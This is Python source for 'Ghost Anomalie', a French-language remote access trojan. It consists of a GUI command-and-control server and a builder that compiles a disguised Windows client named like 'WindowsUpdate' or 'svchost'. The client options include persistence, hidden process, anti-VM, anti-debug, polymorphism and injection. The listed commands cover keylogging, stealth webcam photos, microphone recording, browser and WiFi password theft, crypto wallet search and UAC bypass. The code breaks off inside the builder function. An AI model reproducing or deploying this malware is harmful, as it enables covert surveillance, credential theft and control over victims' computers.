import socket
import threading
import tkinter as tk
from tkinter import scrolledtext, ttk, filedialog, messagebox
from datetime import datetime
import json
import base64
import os
import sys
import time
import subprocess
import shutil
import random
import string
import struct
import tempfile
from PIL import Image, ImageTk
import io
import zipfile

# ===== CONFIGURATION =====
VERSION = "1.3.0"
NOM_APP = "Ghost Anomalie"
AUTEUR = "🖤 Dev Messy from gabon"
COMMANDES_VERSION = "v1.0 - 92 commandes"

# ===== FENÊTRE PRINCIPALE =====
class GhostAnomalie:
    def __init__(self):
        self.serveur = None
        self.clients = {}
        self.running = False
        self.ip = ""
        self.port = 4444
        self.mot_de_passe = "admin123"
        self.partial_data = {}
        self.client_selectionne = None

        # === FENÊTRE ===
        self.window = tk.Tk()
        self.window.title("🐀 Ghost Anomalie")
        self.window.geometry("1500x950")
        self.window.configure(bg='#05050f')
        self.window.resizable(True, True)

        # === VARIABLES ===
        self.ip_var = tk.StringVar(value="127.0.0.1")
        self.port_var = tk.StringVar(value="4444")
        self.mdp_var = tk.StringVar(value="admin123")
        self.client_nom_var = tk.StringVar(value="GhostClient")
        self.client_nom_fichier_var = tk.StringVar(value="WindowsUpdate")

        # === CONSTRUIRE ===
        self.construire_interface()
        self.demarrer_serveur()

    # ============================================================
    # INTERFACE PRINCIPALE
    # ============================================================

    def construire_interface(self):
        self.window.configure(bg='#05050f')

        # ===== HEADER =====
        header = tk.Frame(self.window, bg='#0a0a1a', height=90)
        header.pack(fill=tk.X, padx=0, pady=0)
        header.pack_propagate(False)

        # Titre avec effet néon
        titre = tk.Label(header, text="👻 GHOST ANOMALIE", 
                        font=('Arial Black', 32, 'bold'), 
                        fg='#00ff88', bg='#0a0a1a')
        titre.pack(side=tk.LEFT, padx=20, pady=10)

        # Version
        tk.Label(header, text=f"v{VERSION} • {COMMANDES_VERSION}", 
                font=('Arial', 10), fg='#666', bg='#0a0a1a').pack(side=tk.LEFT, padx=10)

        # Status
        self.status_header = tk.Label(header, text="🔴 OFFLINE", 
                                     font=('Arial', 14, 'bold'),
                                     fg='#ff3333', bg='#0a0a1a')
        self.status_header.pack(side=tk.RIGHT, padx=20)

        # ===== PANEL PRINCIPAL =====
        main_panel = tk.Frame(self.window, bg='#05050f')
        main_panel.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        # ===== GAUCHE : CONFIG + GÉNÉRATEUR =====
        left_panel = tk.Frame(main_panel, bg='#0a0a1a', width=400)
        left_panel.pack(side=tk.LEFT, fill=tk.BOTH, padx=(0, 10))
        left_panel.pack_propagate(False)

        # --- SCROLL POUR GAUCHE ---
        left_canvas = tk.Canvas(left_panel, bg='#0a0a1a', highlightthickness=0)
        left_scrollbar = tk.Scrollbar(left_panel, orient="vertical", command=left_canvas.yview)
        left_scrollable = tk.Frame(left_canvas, bg='#0a0a1a')

        left_scrollable.bind(
            "<Configure>",
            lambda e: left_canvas.configure(scrollregion=left_canvas.bbox("all"))
        )

        left_canvas.create_window((0, 0), window=left_scrollable, anchor="nw")
        left_canvas.configure(yscrollcommand=left_scrollbar.set)

        left_canvas.pack(side="left", fill="both", expand=True)
        left_scrollbar.pack(side="right", fill="y")

        # --- CONTENU GAUCHE ---
        # Titre
        tk.Label(left_scrollable, text="⚙️ CONFIGURATION C2", 
                font=('Arial', 16, 'bold'), fg='#00ff88', bg='#0a0a1a').pack(pady=10)

        # Cadre Config
        config_frame = tk.LabelFrame(left_scrollable, text="📍 Serveur de Contrôle", 
                                    fg='#00ff88', bg='#0a0a1a', font=('Arial', 11))
        config_frame.pack(fill=tk.X, padx=10, pady=5)

        # IP
        tk.Label(config_frame, text="🌐 IP du serveur:", fg='#aaa', bg='#0a0a1a').pack(anchor=tk.W, padx=5, pady=2)
        ip_entry = tk.Entry(config_frame, textvariable=self.ip_var, bg='#1a1a2e', 
                           fg='#00ff88', insertbackground='white', font=('Courier', 11))
        ip_entry.pack(fill=tk.X, padx=5, pady=2)

        # Port
        tk.Label(config_frame, text="🔌 Port:", fg='#aaa', bg='#0a0a1a').pack(anchor=tk.W, padx=5, pady=2)
        port_entry = tk.Entry(config_frame, textvariable=self.port_var, bg='#1a1a2e', 
                             fg='#00ff88', insertbackground='white', font=('Courier', 11))
        port_entry.pack(fill=tk.X, padx=5, pady=2)

        # Mot de passe
        tk.Label(config_frame, text="🔑 Mot de passe:", fg='#aaa', bg='#0a0a1a').pack(anchor=tk.W, padx=5, pady=2)
        mdp_entry = tk.Entry(config_frame, textvariable=self.mdp_var, bg='#1a1a2e', 
                            fg='#00ff88', insertbackground='white', font=('Courier', 11),
                            show="•")
        mdp_entry.pack(fill=tk.X, padx=5, pady=2)

        # Boutons Serveur
        btn_frame = tk.Frame(left_scrollable, bg='#0a0a1a')
        btn_frame.pack(fill=tk.X, padx=10, pady=5)

        self.btn_start = tk.Button(btn_frame, text="▶️ START SERVER", 
                                  command=self.basculer_serveur,
                                  bg='#00ff88', fg='#05050f', font=('Arial', 13, 'bold'),
                                  padx=20, pady=8, relief=tk.FLAT, cursor='hand2')
        self.btn_start.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=2)

        # --- Cadre Générateur ---
        gen_frame = tk.LabelFrame(left_scrollable, text="🎯 GÉNÉRATEUR DE CLIENT", 
                                 fg='#ffaa00', bg='#0a0a1a', font=('Arial', 11))
        gen_frame.pack(fill=tk.X, padx=10, pady=10)

        # Nom du client (affiché)
        tk.Label(gen_frame, text="👤 Nom du client (affiché):", fg='#aaa', bg='#0a0a1a').pack(anchor=tk.W, padx=5, pady=2)
        tk.Entry(gen_frame, textvariable=self.client_nom_var, bg='#1a1a2e', 
                fg='#00ff88', insertbackground='white', font=('Courier', 11)).pack(fill=tk.X, padx=5, pady=2)

        # Nom du fichier EXE
        tk.Label(gen_frame, text="📁 Nom du fichier EXE:", fg='#aaa', bg='#0a0a1a').pack(anchor=tk.W, padx=5, pady=2)
        tk.Entry(gen_frame, textvariable=self.client_nom_fichier_var, bg='#1a1a2e', 
                fg='#00ff88', insertbackground='white', font=('Courier', 11)).pack(fill=tk.X, padx=5, pady=2)

        tk.Label(gen_frame, text="💡 Ex: WindowsUpdate, svchost, explorer", 
                fg='#666', bg='#0a0a1a', font=('Arial', 8)).pack(anchor=tk.W, padx=5)

        # Options
        options_frame = tk.LabelFrame(gen_frame, text="🛡️ Options", 
                                     fg='#00aaff', bg='#0a0a1a', font=('Arial', 9))
        options_frame.pack(fill=tk.X, padx=5, pady=5)

        self.persist_var = tk.BooleanVar(value=True)
        self.hide_var = tk.BooleanVar(value=True)
        self.startup_var = tk.BooleanVar(value=True)
        self.anti_vm_var = tk.BooleanVar(value=True)
        self.anti_debug_var = tk.BooleanVar(value=True)
        self.polymorph_var = tk.BooleanVar(value=True)
        self.inject_var = tk.BooleanVar(value=False)

        check_frame = tk.Frame(options_frame, bg='#0a0a1a')
        check_frame.pack(fill=tk.X, padx=5, pady=5)

        tk.Checkbutton(check_frame, text="🔄 Persistance", variable=self.persist_var,
                      fg='#00ff88', bg='#0a0a1a', selectcolor='#0a0a1a').pack(anchor=tk.W)
        tk.Checkbutton(check_frame, text="👻 Caché (processus invisible)", variable=self.hide_var,
                      fg='#00ff88', bg='#0a0a1a', selectcolor='#0a0a1a').pack(anchor=tk.W)
        tk.Checkbutton(check_frame, text="🚀 Démarrage auto", variable=self.startup_var,
                      fg='#00ff88', bg='#0a0a1a', selectcolor='#0a0a1a').pack(anchor=tk.W)
        tk.Checkbutton(check_frame, text="🛡️ Anti-VM (détection sandbox)", variable=self.anti_vm_var,
                      fg='#00ff88', bg='#0a0a1a', selectcolor='#0a0a1a').pack(anchor=tk.W)
        tk.Checkbutton(check_frame, text="🔍 Anti-Debug", variable=self.anti_debug_var,
                      fg='#00ff88', bg='#0a0a1a', selectcolor='#0a0a1a').pack(anchor=tk.W)
        tk.Checkbutton(check_frame, text="🎭 Polymorphisme (change de hash)", variable=self.polymorph_var,
                      fg='#00ff88', bg='#0a0a1a', selectcolor='#0a0a1a').pack(anchor=tk.W)
        tk.Checkbutton(check_frame, text="💉 Injection processus", variable=self.inject_var,
                      fg='#00ff88', bg='#0a0a1a', selectcolor='#0a0a1a').pack(anchor=tk.W)

        # Bouton générer
        self.btn_generate = tk.Button(gen_frame, text="🔥 GENERER CLIENT .EXE", 
                                     command=self.generer_client,
                                     bg='#ff4400', fg='white', font=('Arial', 15, 'bold'),
                                     padx=20, pady=12, relief=tk.FLAT, cursor='hand2')
        self.btn_generate.pack(fill=tk.X, padx=5, pady=10)

        # Status génération
        self.status_gen = tk.Label(gen_frame, text="✅ Prêt à générer", 
                                  fg='#00ff88', bg='#0a0a1a', font=('Arial', 9))
        self.status_gen.pack(pady=2)

        # --- Clients connectés ---
        clients_frame = tk.LabelFrame(left_scrollable, text="👥 CLIENTS CONNECTÉS", 
                                     fg='#00aaff', bg='#0a0a1a', font=('Arial', 11))
        clients_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)

        self.clients_listbox = tk.Listbox(clients_frame, bg='#0a0a1a', fg='#00ff88',
                                         font=('Courier', 10), selectbackground='#1a1a2e',
                                         height=8)
        self.clients_listbox.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.clients_listbox.bind('<<ListboxSelect>>', self.selectionner_client)

        # ===== DROITE : CONTROLE =====
        right_panel = tk.Frame(main_panel, bg='#0a0a1a')
        right_panel.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)

        # --- TITRE ---
        tk.Label(right_panel, text="💻 CONTRÔLE À DISTANCE", 
                font=('Arial', 16, 'bold'), fg='#00ff88', bg='#0a0a1a').pack(pady=5)

        # --- Info client sélectionné ---
        self.info_frame = tk.LabelFrame(right_panel, text="📡 Client actuel", 
                                       fg='#ffaa00', bg='#0a0a1a', font=('Arial', 10))
        self.info_frame.pack(fill=tk.X, padx=10, pady=5)

        self.client_info = tk.Label(self.info_frame, text="Aucun client sélectionné", 
                                   fg='#aaa', bg='#0a0a1a', font=('Arial', 11))
        self.client_info.pack(padx=10, pady=5)

        # --- Commandes ---
        cmd_frame = tk.LabelFrame(right_panel, text="⌨️ COMMANDES", 
                                 fg='#00ff88', bg='#0a0a1a', font=('Arial', 10))
        cmd_frame.pack(fill=tk.X, padx=10, pady=5)

        # Ligne de commande
        cmd_row = tk.Frame(cmd_frame, bg='#0a0a1a')
        cmd_row.pack(fill=tk.X, padx=5, pady=5)

        self.entry_cmd = tk.Entry(cmd_row, bg='#1a1a2e', fg='#00ff88', 
                                 insertbackground='white', font=('Courier', 11))
        self.entry_cmd.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))
        self.entry_cmd.bind('<Return>', lambda e: self.envoyer_commande())

        tk.Button(cmd_row, text="🚀", command=self.envoyer_commande,
                 bg='#1a1a2e', fg='#00ff88', font=('Arial', 14)).pack(side=tk.RIGHT)

        # Catégories de commandes (avec SCROLL)
        cat_frame = tk.LabelFrame(cmd_frame, text="📋 Commandes rapides", 
                                 fg='#00aaff', bg='#0a0a1a', font=('Arial', 9))
        cat_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        # Canvas pour scroll des catégories
        cat_canvas = tk.Canvas(cat_frame, bg='#0a0a1a', highlightthickness=0, height=120)
        cat_scrollbar = tk.Scrollbar(cat_frame, orient="vertical", command=cat_canvas.yview)
        cat_scrollable = tk.Frame(cat_canvas, bg='#0a0a1a')

        cat_scrollable.bind(
            "<Configure>",
            lambda e: cat_canvas.configure(scrollregion=cat_canvas.bbox("all"))
        )

        cat_canvas.create_window((0, 0), window=cat_scrollable, anchor="nw")
        cat_canvas.configure(yscrollcommand=cat_scrollbar.set)

        # CATÉGORIES DE COMMANDES
        categories = [
            ("🖥️ Bureau", ["screenshot", "bureau", "bureau_start 30 10", "bureau_stop", "rotation 90", "ecran_noir"]),
            ("🖱️ Souris", ["souris_move 0.5 0.5", "souris_click 1", "souris_click 1 double", "souris_scroll down 3"]),
            ("⌨️ Clavier", ["clavier_texte Bonjour", "clavier_touche enter", "clavier_touche ctrl+c combinaison"]),
            ("🚀 Apps", ["app_lancer notepad.exe", "app_lancer cmd.exe invisible", "app_cacher_tout", "app_montrer_tout"]),
            ("📷 Cam/Mic", ["camera_start", "camera_photo", "camera_stealth", "micro_start", "micro_record 5"]),
            ("🔑 Keylog", ["keylogger_start", "keylogger_stop", "keylogger_export"]),
            ("🔐 Passwords", ["pass_wifi", "pass_chrome", "crypto_wallets", "pass_all"]),
            ("📁 Fichiers", ["ls", "cd ..", "pwd", "download fichier.txt", "mkdir test"]),
            ("🌐 Network", ["network_scan", "port_scan 192.168.1.1", "wifi_list", "dns_flush"]),
            ("⚙️ System", ["sysinfo", "cmd ipconfig", "lock", "shutdown", "restart"]),
            ("🕵️ Surf", ["surveillance_start", "surveillance_stop", "search_files mot"]),
            ("🎥 Record", ["record_start 20 10", "record_stop"]),
            ("🛡️ Hide", ["hide", "persist", "uac_bypass", "selfdestruct"]),
            ("📋 Clipboard", ["clipboard_get", "clipboard_set Texte", "clipboard_monitor"]),
            ("⚙️ Proc", ["processus_list", "processus_kill 1234", "service_list"]),
            ("🎮 Blagues", ["popup 'Salut !'", "speak 'Bonjour'", "volume_mute", "cd_eject"]),
        ]

        for categorie, commandes in categories:
            tk.Label(cat_scrollable, text=categorie, fg='#ffaa00', bg='#0a0a1a',
                    font=('Arial', 9, 'bold')).pack(anchor=tk.W, pady=2)

            btn_row = tk.Frame(cat_scrollable, bg='#0a0a1a')
            btn_row.pack(fill=tk.X, pady=1)

            for cmd in commandes:
                tk.Button(btn_row, text=cmd[:15], 
                         command=lambda c=cmd: self.entry_cmd.delete(0, tk.END) or self.entry_cmd.insert(0, c),
                         bg='#1a1a2e', fg='#00ff88', font=('Arial', 7), padx=3, pady=1).pack(side=tk.LEFT, padx=1)

        cat_canvas.pack(side="left", fill="both", expand=True)
        cat_scrollbar.pack(side="right", fill="y")

        # --- Résultats ---
        result_frame = tk.LabelFrame(right_panel, text="📝 LOGS & RÉSULTATS", 
                                    fg='#00aaff', bg='#0a0a1a', font=('Arial', 10))
        result_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)

        self.logs = scrolledtext.ScrolledText(result_frame, bg='#05050f', fg='#00ff88',
                                             font=('Courier', 9), insertbackground='white')
        self.logs.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        # --- Image preview ---
        self.image_frame = tk.Frame(right_panel, bg='#0a0a1a', height=150)
        self.image_frame.pack(fill=tk.X, padx=10, pady=5)
        self.image_label = tk.Label(self.image_frame, bg='#0a0a1a', 
                                   text="📸 Aperçu images", fg='#666', font=('Arial', 12))
        self.image_label.pack(expand=True, fill=tk.BOTH)

        # ===== BARRE D'ÉTAT =====
        status_bar = tk.Frame(self.window, bg='#0a0a1a', height=30)
        status_bar.pack(fill=tk.X, side=tk.BOTTOM)

        self.status_text = tk.Label(status_bar, text="👻 Ghost Anomalie - Prêt", 
                                   fg='#666', bg='#0a0a1a', font=('Arial', 9))
        self.status_text.pack(side=tk.LEFT, padx=10)

        self.status_clients = tk.Label(status_bar, text="👥 0 clients", 
                                      fg='#00ff88', bg='#0a0a1a', font=('Arial', 9))
        self.status_clients.pack(side=tk.RIGHT, padx=10)

        self.status_commande = tk.Label(status_bar, text=f"📋 {COMMANDES_VERSION}", 
                                       fg='#666', bg='#0a0a1a', font=('Arial', 8))
        self.status_commande.pack(side=tk.RIGHT, padx=10)

        # Lancer la mise à jour
        self.mettre_a_jour_interface()

        # Log initial
        self.log("👻 Ghost Anomalie v" + VERSION + " - " + COMMANDES_VERSION)
        self.log("📋 " + str(len(self.get_all_commandes())) + " commandes disponibles")
        self.log("💡 Sélectionne un client dans la liste pour commencer")

    # ============================================================
    # LISTE COMPLÈTE DES COMMANDES
    # ============================================================

    def get_all_commandes(self):
        """Retourne la liste de TOUTES les commandes disponibles"""
        return {
            # Bureau
            "screenshot": "Capture d'écran",
            "bureau": "Bureau à distance (stream)",
            "bureau_start": "Démarrer stream bureau (qualité FPS)",
            "bureau_stop": "Arrêter stream bureau",
            "bureau_ecrans": "Lister les écrans",
            "ecran_noir": "Activer écran noir",
            "ecran_normal": "Désactiver écran noir",
            "rotation": "Rotation écran (0,90,180,270)",

            # Souris
            "souris_move": "Déplacer souris (x y)",
            "souris_click": "Clic souris (1=gauche,2=droit,3=milieu)",
            "souris_scroll": "Défiler (up/down quantite)",
            "souris_glisser": "Glisser-déposer (x1 y1 x2 y2)",

            # Clavier
            "clavier_texte": "Écrire du texte",
            "clavier_touche": "Appuyer sur une touche",

            # Apps cachées
            "app_lancer": "Lancer application (visible/invisible/admin)",
            "app_visible": "Rendre visible (PID)",
            "app_invisible": "Rendre invisible (PID)",
            "app_cacher_tout": "Cacher TOUTES les fenêtres",
            "app_montrer_tout": "Montrer toutes les fenêtres",
            "app_fenetres": "Lister les fenêtres ouvertes",

            # Caméra
            "camera_start": "Démarrer caméra",
            "camera_stop": "Arrêter caméra",
            "camera_photo": "Prendre photo",
            "camera_stealth": "Photo furtive (LED off)",

            # Micro
            "micro_start": "Démarrer micro",
            "micro_stop": "Arrêter micro",
            "micro_record": "Enregistrer audio (secondes)",

            # Keylogger
            "keylogger_start": "Démarrer keylogger",
            "keylogger_stop": "Arrêter keylogger",
            "keylogger_export": "Exporter logs keylogger",

            # Presse-papiers
            "clipboard_get": "Lire presse-papiers",
            "clipboard_set": "Écrire dans presse-papiers",
            "clipboard_monitor": "Surveiller presse-papiers",

            # Vol de données
            "pass_wifi": "Extraire mots de passe WiFi",
            "pass_chrome": "Extraire mots de passe Chrome",
            "pass_firefox": "Extraire mots de passe Firefox",
            "pass_edge": "Extraire mots de passe Edge",
            "pass_all": "Extraire TOUS les mots de passe",
            "crypto_wallets": "Trouver portefeuilles crypto",

            # Surveillance
            "surveillance_start": "Démarrer surveillance",
            "surveillance_stop": "Arrêter surveillance",
            "search_files": "Rechercher fichiers (motif)",
            "search_docs": "Rechercher documents (.pdf, .docx)",

            # Réseau
            "network_scan": "Scanner réseau (IP/range)",
            "port_scan": "Scanner ports (IP ports)",
            "arp_scan": "Scanner ARP",
            "wifi_list": "Lister réseaux WiFi",
            "wifi_connect": "Se connecter à un WiFi",
            "dns_flush": "Vider cache DNS",

            # Processus
            "processus_list": "Lister processus",
            "processus_kill": "Tuer processus (PID)",
            "service_list": "Lister services",
            "service_start": "Démarrer service",
            "service_stop": "Arrêter service",

            # Fichiers
            "ls": "Lister fichiers",
            "cd": "Changer dossier",
            "pwd": "Dossier actuel",
            "mkdir": "Créer dossier",
            "rm": "Supprimer fichier/dossier",
            "mv": "Renommer/déplacer",
            "download": "Télécharger fichier",
            "upload": "Uploader fichier",

            # Enregistrement
            "record_start": "Démarrer enregistrement vidéo",
            "record_stop": "Arrêter enregistrement",

            # Furtivité
            "hide": "Cacher le processus",
            "persist": "Ajouter persistance",
            "uac_bypass": "Contourner UAC",
            "polymorph": "Changer hash du fichier",
            "inject": "Injection dans processus",
            "update": "Mise à jour automatique",
            "selfdestruct": "Auto-destruction",

            # Anti-détection
            "anti_vm": "Détecter VM",
            "anti_debug": "Détecter debug",
            "anti_av": "Détecter antivirus",

            # Divertissement
            "popup": "Afficher popup",
            "speak": "Synthèse vocale",
            "website": "Ouvrir site web",
            "beep": "Faire un bip",
            "cd_eject": "Ouvrir lecteur CD",
            "cd_close": "Fermer lecteur CD",
            "mouse_disable": "Désactiver souris",
            "mouse_enable": "Réactiver souris",
            "keyboard_disable": "Désactiver clavier",
            "keyboard_enable": "Réactiver clavier",
            "volume_set": "Régler volume",
            "volume_mute": "Couper le son",

            # Système
            "sysinfo": "Infos système",
            "cmd": "Exécuter commande système",
            "shutdown": "Éteindre PC",
            "restart": "Redémarrer PC",
            "lock": "Verrouiller écran",
            "logoff": "Déconnexion",
            "hibernate": "Mettre en veille",

            # Autres
            "exit": "Déconnecter client"
        }

    # ============================================================
    # FONCTIONS SERVEUR
    # ============================================================

    def demarrer_serveur(self):
        try:
            self.ip = self.ip_var.get()
            self.port = int(self.port_var.get())
            self.mot_de_passe = self.mdp_var.get()

            self.serveur = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.serveur.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.serveur.bind(('0.0.0.0', self.port))
            self.serveur.listen(10)
            self.running = True

            self.status_header.config(text="🟢 ONLINE", fg='#00ff88')
            self.btn_start.config(text="⏹️ STOP SERVER", bg='#ff3333')
            self.log("✅ Serveur démarré sur le port " + str(self.port))
            self.log("📡 IP: " + self.ip + " | 🔑 Mot de passe: " + self.mot_de_passe)

            threading.Thread(target=self.accepter_clients, daemon=True).start()

        except Exception as e:
            self.log("❌ Erreur démarrage: " + str(e))
            messagebox.showerror("Erreur", "Impossible de démarrer le serveur:\n" + str(e))

    def arreter_serveur(self):
        self.running = False
        if self.serveur:
            try:
                self.serveur.close()
            except:
                pass

        self.status_header.config(text="🔴 OFFLINE", fg='#ff3333')
        self.btn_start.config(text="▶️ START SERVER", bg='#00ff88')
        self.log("⏹️ Serveur arrêté")

    def basculer_serveur(self):
        if self.running:
            self.arreter_serveur()
        else:
            self.demarrer_serveur()

    def accepter_clients(self):
        while self.running:
            try:
                client, addr = self.serveur.accept()
                self.log("🔗 Nouvelle connexion de " + addr[0])

                auth_req = client.recv(1024).decode()
                if auth_req.startswith("AUTH|"):
                    data = auth_req[5:].split('|')
                    mdp = data[0] if len(data) > 0 else ""
                    nom = data[1] if len(data) > 1 else addr[0]

                    if mdp == self.mot_de_passe:
                        client.send(b"AUTH|OK")
                        self.clients[addr] = {
                            'socket': client,
                            'nom': nom,
                            'ip': addr[0],
                            'port': addr[1],
                            'connecte': True,
                            'temps': time.time()
                        }
                        self.log("✅ Client authentifié: " + nom + " (" + addr[0] + ")")
                        threading.Thread(target=self.gerer_client, args=(client, addr), daemon=True).start()
                    else:
                        client.send(b"AUTH|ERREUR")
                        client.close()
                        self.log("❌ Refusé: " + addr[0] + " (mauvais mot de passe)")
            except:
                pass

    def gerer_client(self, client, addr):
        while self.running and addr in self.clients:
            try:
                data = client.recv(8192).decode()
                if not data:
                    break

                if data.startswith("RESULTAT|"):
                    resultat = data[9:]
                    if resultat == "__FIN__":
                        continue
                    self.afficher_resultat(resultat)

                elif data.startswith("BUREAU|"):
                    parts = data[7:].split('|')
                    if len(parts) >= 3:
                        img_data = parts[2]
                        self.afficher_image(img_data)

                elif data.startswith("CAMERA|"):
                    self.afficher_image(data[7:])

                elif data.startswith("PHOTO|"):
                    self.afficher_image(data[6:])

                elif data.startswith("KEYLOG|"):
                    self.log("⌨️ Keylogger: " + data[7:])

                elif data.startswith("ALERTE|"):
                    self.log("🚨 ALERTE: " + data[7:])

                elif data.startswith("FICHIERS_TROUVES|"):
                    self.log("📁 Nouveaux fichiers: " + data[16:][:200])

                elif data.startswith("INFO|"):
                    self.log("ℹ️ " + data[5:])

                elif data.startswith("AUDIO|"):
                    self.log("🎤 Audio reçu")
                    try:
                        audio_data = data[6:]
                        audio_bytes = base64.b64decode(audio_data)
                        os.makedirs("audio", exist_ok=True)
                        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                        with open("audio/audio_" + timestamp + ".wav", 'wb') as f:
                            f.write(audio_bytes)
                        self.log("💾 Audio sauvegardé: audio_" + timestamp + ".wav")
                    except:
                        pass

            except Exception as e:
                self.log("⚠️ Erreur client " + addr[0] + ": " + str(e))
                break

        if addr in self.clients:
            nom = self.clients[addr].get('nom', addr[0])
            del self.clients[addr]
            self.log("🔌 Client déconnecté: " + nom)

    # ============================================================
    # ENVOI DE COMMANDES
    # ============================================================

    def envoyer_commande(self):
        cmd = self.entry_cmd.get()
        if not cmd:
            return

        selection = self.clients_listbox.curselection()
        if not selection:
            self.log("❌ Aucun client sélectionné")
            return

        index = selection[0]
        item = self.clients_listbox.get(index)

        client = None
        for addr, info in self.clients.items():
            if info['nom'] + " (" + info['ip'] + ")" == item:
                client = info
                break

        if not client:
            self.log("❌ Client non trouvé")
            return

        try:
            client['socket'].send(cmd.encode())
            self.log("📤 " + cmd)
            self.entry_cmd.delete(0, tk.END)

            if not hasattr(self, 'historique_cmd'):
                self.historique_cmd = []
            self.historique_cmd.append(cmd)
            if len(self.historique_cmd) > 50:
                self.historique_cmd = self.historique_cmd[-50:]

        except Exception as e:
            self.log("❌ Erreur: " + str(e))

    def selectionner_client(self, event):
        selection = self.clients_listbox.curselection()
        if selection:
            item = self.clients_listbox.get(selection[0])
            self.client_info.config(text="🎯 " + item)
            self.log("📡 Client sélectionné: " + item)

    # ============================================================
    # AFFICHAGE
    # ============================================================

    def log(self, message):
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.logs.insert(tk.END, "[" + timestamp + "] " + message + "\n")
        self.logs.see(tk.END)
        self.status_text.config(text=message[:60])

    def afficher_resultat(self, resultat):
        if resultat.startswith("[PHOTO]") or resultat.startswith("[IMAGE]"):
            img_data = resultat[7:] if resultat.startswith("[PHOTO]") else resultat[7:]
            self.afficher_image(img_data)
            return

        if resultat.startswith("[FICHIER]"):
            parts = resultat[9:].split('|')
            if len(parts) >= 3:
                nom = parts[0]
                contenu = parts[2]
                file_path = filedialog.asksaveasfilename(initialfile=nom)
                if file_path:
                    try:
                        with open(file_path, 'wb') as f:
                            f.write(base64.b64decode(contenu))
                        self.log("💾 Fichier sauvegardé: " + file_path)
                    except Exception as e:
                        self.log("❌ Erreur sauvegarde: " + str(e))
                return

        try:
            data = json.loads(resultat)
            if isinstance(data, dict):
                formatted = json.dumps(data, indent=2, ensure_ascii=False)[:1000]
                self.log("📊 " + formatted)
                return
        except:
            pass

        if len(resultat) > 500:
            self.log("📥 " + resultat[:500] + "...")
        else:
            self.log("📥 " + resultat)

    def afficher_image(self, img_data):
        try:
            img_bytes = base64.b64decode(img_data)
            image = Image.open(io.BytesIO(img_bytes))

            max_w = 400
            max_h = 250
            ratio = min(max_w/image.width, max_h/image.height)
            new_size = (int(image.width*ratio), int(image.height*ratio))
            image = image.resize(new_size, Image.Resampling.LANCZOS)

            photo = ImageTk.PhotoImage(image)
            self.image_label.config(image=photo, text="")
            self.image_label.image = photo

            os.makedirs("captures", exist_ok=True)
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            image.save("captures/image_" + timestamp + ".jpg")
            self.log("💾 Image sauvegardée: image_" + timestamp + ".jpg")

        except Exception as e:
            self.log("❌ Erreur image: " + str(e))

    # ============================================================
    # GÉNÉRATEUR DE CLIENT (CORRIGÉ - SANS F-STRINGS)
    # ============================================================

    def generer_client(self):
        try:
            self.status_gen.config(text="⏳ Génération en cours...", fg='#ffaa00')
            self.log("🔥 Génération du client avec TOUTES les commandes...")

            ip = self.ip_var.get()
            port = self.port_var.get()
            mdp = self.mdp_var.get()
            nom_client = self.client_nom_var.get()
            nom_fichier = self.client_nom_fichier_var.get()

            nom_fichier = ''.join(c for c in nom_fichier if c.isalnum() or c in ['_', '-'])
            if not nom_fichier:
                nom_fichier = "GhostClient"

            persist = self.persist_var.get()
            hide = self.hide_var.get()
            startup = self.startup_var.get()
            anti_vm = self.anti_vm_var.get()
            anti_debug = self.anti_debug_var.get()
            polymorph = self.polymorph_var.get()
            inject = self.inject_var.get()

            build_dir = os.path.join(os.getcwd(), "build_client")
            os.makedirs(build_dir, exist_ok=True)

            client_code = self.generer_code_client_complet(
                ip, port, mdp, nom_client, nom_fichier,
                persist, hide, startup, anti_vm, anti_debug, polymorph, inject
            )

            client_file = os.path.join(build_dir, "client.py")
            with open(client_file, 'w', encoding='utf-8') as f:
                f.write(client_code)

            self.log("🔧 Compilation en cours (5-10 minutes)...")

            try:
                import PyInstaller
            except ImportError:
                subprocess.run([sys.executable, "-m", "pip", "install", "pyinstaller"], 
                             capture_output=True)

            clients_dir = os.path.join(os.getcwd(), "clients")
            os.makedirs(clients_dir, exist_ok=True)

            cmd = [
                sys.executable, "-m", "PyInstaller",
                "--onefile",
                "--noconsole",
                "--name", nom_fichier,
                "--distpath", clients_dir,
                "--workpath", os.path.join(build_dir, "build"),
                "--specpath", build_dir,
                "--log-level", "WARN",
                "--hidden-import", "PIL",
                "--hidden-import", "PIL.ImageGrab",
                "--hidden-import", "cv2",
                "--hidden-import", "pyaudio",
                "--hidden-import", "wave",
                "--hidden-import", "win32api",
                "--hidden-import", "win32con",
                "--hidden-import", "win32gui",
                "--hidden-import", "win32process",
                "--hidden-import", "win32clipboard",
                "--hidden-import", "win32ui",
                "--hidden-import", "win32pdh",
                "--hidden-import", "win32security",
                "--hidden-import", "win32file",
                "--hidden-import", "win32event",
                "--hidden-import", "win32service",
                "--hidden-import", "win32serviceutil",
                "--hidden-import", "win32com.client",
                "--hidden-import", "wmi",
                "--hidden-import", "psutil",
                "--hidden-import", "cryptography",
                "--hidden-import", "cryptography.fernet",
                "--hidden-import", "ipaddress",
                "--hidden-import", "urllib",
                "--hidden-import", "requests",
                client_file
            ]

            result = subprocess.run(cmd, capture_output=True, text=True)

            if result.returncode == 0:
                exe_path = os.path.join(clients_dir, nom_fichier + ".exe")
                if os.path.exists(exe_path):
                    taille = os.path.getsize(exe_path) / (1024*1024)
                    self.status_gen.config(text="✅ Client généré ! (" + str(round(taille, 1)) + " MB)", fg='#00ff88')
                    self.log("✅ CLIENT GÉNÉRÉ: " + exe_path + " (" + str(round(taille, 1)) + " MB)")
                    self.log("📋 " + str(len(self.get_all_commandes())) + " commandes disponibles")
                    os.startfile(os.path.dirname(exe_path))
                    if not self.running:
                        self.log("⚠️ Le serveur n'est pas démarré ! Clique sur START SERVER")
                else:
                    self.status_gen.config(text="❌ Erreur: fichier non trouvé", fg='#ff3333')
                    self.log("❌ Erreur: " + result.stderr)
            else:
